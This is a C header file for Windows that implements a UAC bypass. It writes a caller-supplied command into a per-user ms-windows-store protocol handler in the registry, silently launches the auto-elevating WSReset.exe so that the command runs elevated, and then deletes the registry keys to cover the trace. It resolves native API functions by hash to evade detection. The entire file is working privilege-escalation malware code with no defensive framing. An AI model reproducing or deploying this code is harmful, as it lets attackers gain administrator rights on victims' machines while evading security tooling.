// Only compatible with LTSC and Server Windows Editions (ones without Microsoft Store)

#ifndef MSSTORE_H
#define MSSTORE_H

#include "winapi_loader.h"
#include <ntstatus.h>
#include <shellapi.h>

// -------------------- Types --------------------
typedef NTSTATUS (NTAPI *NtOpenProcessToken_t)(HANDLE, ACCESS_MASK, PHANDLE);
typedef NTSTATUS (NTAPI *NtQueryInformationToken_t)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtClose_t)(HANDLE);
typedef NTSTATUS (NTAPI *NtCreateKey_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtOpenKey_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *NtSetValueKey_t)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *NtDeleteKey_t)(HANDLE);
typedef NTSTATUS (NTAPI *NtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);

typedef BOOL (WINAPI *ShellExecuteExW_t)(LPSHELLEXECUTEINFOW);

// -------------------- Strings --------------------
#define ntopenprocesstoken HASH("NtOpenProcessToken")
#define ntqueryinformationtoken HASH("NtQueryInformationToken")
#define ntwaitforsingleobject HASH("NtWaitForSingleObject")
#define ntcreatekey HASH("NtCreateKey")
#define ntopenkey HASH("NtOpenKey")
#define ntsetvaluekey HASH("NtSetValueKey")
#define ntdeletekey HASH("NtDeleteKey")
#define ntclose HASH("NtClose")
#define shellexecuteexw HASH("ShellExecuteExW")

STRINGW(shell32_dll, "shell32.dll")
STRINGW(reguser, "\\Registry\\User\\")
STRINGW(suf, "Software\\Classes\\ms-windows-store")
STRINGW(urlproto, "URL Protocol")
STRINGW(shell, "shell")
STRINGW(open, "open")
STRINGW(command, "command")
STRINGW(autoele_exe, "\\System32\\WSReset.exe")

// -------------------- Helpers --------------------
static SIZE_T wlen_(const wchar_t *s) {
    SIZE_T n = 0;
    while (s[n]) ++n;
    return n;
}

static void wcopy_(wchar_t *dst, const wchar_t *src, size_t *j) {
    for (size_t i = 0; src[i]; i++)
        dst[(*j)++] = src[i];
}

// -------------------- SID Helpers --------------------
static unsigned int u64_digits(unsigned long long v) {
    unsigned int d = 1;
    while (v >= 10) {
        v /= 10;
        d++;
    }
    return d;
}

static unsigned long long ia_to_u64(const SID* s) {
    return
        ((unsigned long long)s->IdentifierAuthority.Value[5]) |
        ((unsigned long long)s->IdentifierAuthority.Value[4] << 8)  |
        ((unsigned long long)s->IdentifierAuthority.Value[3] << 16) |
        ((unsigned long long)s->IdentifierAuthority.Value[2] << 24) |
        ((unsigned long long)s->IdentifierAuthority.Value[1] << 32) |
        ((unsigned long long)s->IdentifierAuthority.Value[0] << 40);
}

static unsigned long long sid_len(PSID sid) {
    SID* s = (SID*)sid;

    unsigned long long len = 0;

    len += 2; // "S-"
    len += u64_digits(s->Revision);
    len += 1; // '-'

    unsigned long long ia = ia_to_u64(s);

    len += u64_digits(ia);

    for (ULONG i = 0; i < s->SubAuthorityCount; i++) {
        len += 1; // '-'
        len += u64_digits(s->SubAuthority[i]);
    }

    return len;
}

static wchar_t* append_u64(wchar_t* p, unsigned long long v) {
    if (v >= 10)
        p = append_u64(p, v / 10);

    *p++ = L'0' + (v % 10);
    return p;
}

static void sid_to_string(PSID sid, wchar_t* out) {
    SID* s = (SID*)sid;
    wchar_t* p = out;

    *p++ = L'S';
    *p++ = L'-';

    p = append_u64(p, s->Revision);

    *p++ = L'-';

    unsigned long long ia = ia_to_u64(s);

    p = append_u64(p, ia);

    for (ULONG k = 0; k < s->SubAuthorityCount; k++) {
        *p++ = L'-';
        p = append_u64(p, s->SubAuthority[k]);
    }

    *p = L'\0';
}

// -------------------- Core Logic --------------------
int InvokeMSStoreElevation(const wchar_t* payloadCmd) {
    HMODULE hNtdll = myGetModuleHandleH(ntdll_dll);

    NtOpenProcessToken_t NtOpenProcessToken = (NtOpenProcessToken_t)myGetProcAddressH(hNtdll, ntopenprocesstoken);
    NtQueryInformationToken_t NtQueryInformationToken = (NtQueryInformationToken_t)myGetProcAddressH(hNtdll, ntqueryinformationtoken);
    NtCreateKey_t NtCreateKey = (NtCreateKey_t)myGetProcAddressH(hNtdll, ntcreatekey);
    NtOpenKey_t NtOpenKey = (NtOpenKey_t)myGetProcAddressH(hNtdll, ntopenkey);
    NtSetValueKey_t NtSetValueKey = (NtSetValueKey_t)myGetProcAddressH(hNtdll, ntsetvaluekey);
    NtDeleteKey_t NtDeleteKey = (NtDeleteKey_t)myGetProcAddressH(hNtdll, ntdeletekey);
    NtClose_t NtClose = (NtClose_t)myGetProcAddressH(hNtdll, ntclose);
    NtWaitForSingleObject_t NtWaitForSingleObject = (NtWaitForSingleObject_t)myGetProcAddressH(hNtdll, ntwaitforsingleobject);
    LdrLoadDll_t LdrLoadDll = (LdrLoadDll_t)myGetProcAddressH(hNtdll, ldrloadll);

    int result = 0;

    HANDLE hToken;
    ULONG len = 0;

    NtOpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken);
    NtQueryInformationToken(hToken, TokenUser, NULL, 0, &len);

    unsigned char buffer[len];

    NtQueryInformationToken(hToken, TokenUser, buffer, len, &len);

    NtClose(hToken);

    TOKEN_USER *tu = (TOKEN_USER *)buffer;

    unsigned long long sid_chars = sid_len(tu->User.Sid);

    wchar_t sid[sid_chars + 1];

    sid_to_string(tu->User.Sid, sid);
    
    size_t rootLen = wlen_(reguser) + wlen_(sid) + 1;
    
    wchar_t rootPath[rootLen];
    
    size_t m = 0;
    wcopy_(rootPath, reguser, &m);
    wcopy_(rootPath, sid, &m);
    rootPath[m] = L'\0';
    
    UNICODE_STRING usRoot;
    OBJECT_ATTRIBUTES oaRoot;
    HANDLE hRoot = NULL;
    
    InitUnicodeString(&usRoot, rootPath);
    InitializeObjectAttributes(&oaRoot, &usRoot, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
    NtOpenKey(&hRoot, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &oaRoot);
    
    UNICODE_STRING name;
    OBJECT_ATTRIBUTES oa;
    
    HANDLE hProto;
    HANDLE hShell;
    HANDLE hOpen;
    HANDLE hCommand;
    
    InitUnicodeString(&name, suf);
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, hRoot, NULL);
    
    NTSTATUS status = NtCreateKey(&hProto, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    
    if (!NT_SUCCESS(status))
    {
		NtClose(hRoot);
        return result;
    }
    
    UNICODE_STRING usValue;
    InitUnicodeString(&usValue, urlproto);
    
    WCHAR empty[] = L"";
    
    status = NtSetValueKey(hProto ,&usValue, 0, REG_SZ, empty, sizeof(empty));

    if (!NT_SUCCESS(status))
    {
        NtDeleteKey(hProto); NtClose(hProto);
		NtClose(hRoot);
        return result;
    }

    InitUnicodeString(&name, shell);
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, hProto, NULL);
    
    status = NtCreateKey(&hShell, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    
    if (!NT_SUCCESS(status))
    {
        NtDeleteKey(hProto); NtClose(hProto);
        NtClose(hRoot);
        return result;
    }

    InitUnicodeString(&name, open);
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, hShell, NULL);
    
    status = NtCreateKey(&hOpen, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    
    if (!NT_SUCCESS(status))
    {
        NtDeleteKey(hShell); NtClose(hShell);
        NtDeleteKey(hProto); NtClose(hProto);
        NtClose(hRoot);
        return result;
    }
    
    InitUnicodeString(&name, command);
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, hOpen, NULL);
    
    status = NtCreateKey(&hCommand, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    
    if (!NT_SUCCESS(status))
    {
        NtDeleteKey(hOpen); NtClose(hOpen);
        NtDeleteKey(hShell); NtClose(hShell);
        NtDeleteKey(hProto); NtClose(hProto);
        NtClose(hRoot);
        return result;
    }
    
    UNICODE_STRING nullValue = { 0 };
    
    status = NtSetValueKey(hCommand, &nullValue, 0, REG_SZ, (PVOID)payloadCmd, (ULONG)((wlen_(payloadCmd) + 1) * sizeof(WCHAR)));
   
    if (!NT_SUCCESS(status))
    {
        NtDeleteKey(hCommand); NtClose(hCommand);
        NtDeleteKey(hOpen); NtClose(hOpen);
        NtDeleteKey(hShell); NtClose(hShell);
        NtDeleteKey(hProto); NtClose(hProto);
        NtClose(hRoot);
        return result;
    }
   
    WCHAR* windir = (WCHAR*)(((BYTE*)0x7FFE0000) + 0x030); // NtSystemRoot

    size_t windir_len = wlen_(windir);
    size_t autoele_len = wlen_(autoele_exe);

    WCHAR exePath[windir_len + autoele_len + 1];

    size_t k = 0;

    wcopy_(exePath, windir, &k);
    wcopy_(exePath, autoele_exe, &k);
    exePath[k] = L'\0';

    UNICODE_STRING ustr;
    InitUnicodeString(&ustr, shell32_dll);
    
    HMODULE hShell32 = NULL;
    LdrLoadDll(NULL, 0, &ustr, (PHANDLE)&hShell32);

    ShellExecuteExW_t ShellExecuteExW = (ShellExecuteExW_t)myGetProcAddressH(hShell32, shellexecuteexw);

    SHELLEXECUTEINFOW sei = { 0 };
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = open;
    sei.lpFile = exePath;
    sei.nShow = SW_HIDE;

    if (ShellExecuteExW(&sei))
	{
		result = 1;
        NtWaitForSingleObject(sei.hProcess, FALSE, NULL);
        NtClose(sei.hProcess);
    }

    NtDeleteKey(hCommand); NtClose(hCommand);
    NtDeleteKey(hOpen); NtClose(hOpen);
    NtDeleteKey(hShell); NtClose(hShell);
    NtDeleteKey(hProto); NtClose(hProto);
    NtClose(hRoot);
	
    return result;
}

#endif // MSSTORE_H
